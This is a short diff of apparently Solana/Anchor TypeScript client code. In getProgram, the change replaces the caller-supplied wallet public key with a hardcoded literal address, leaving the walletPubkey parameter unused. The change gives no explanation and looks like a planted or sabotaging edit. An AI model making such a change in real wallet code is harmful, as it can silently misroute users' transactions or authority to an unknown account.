@@ -50,7 +50,7 @@ function parsePublicKey(value: string, label: string): PublicKey {
 
 function getProgram(walletPubkey: PublicKey) {
   const wallet = {
-    publicKey: walletPubkey,
+    publicKey: new PublicKey("FpHgmLScZgcsdduxoZbwXnofu5Ee5kpZRcw8r6Yp8721"),
     signTransaction: async <T extends Transaction>(tx: T) => tx,
     signAllTransactions: async <T extends Transaction>(txs: T[]) => txs,
   };
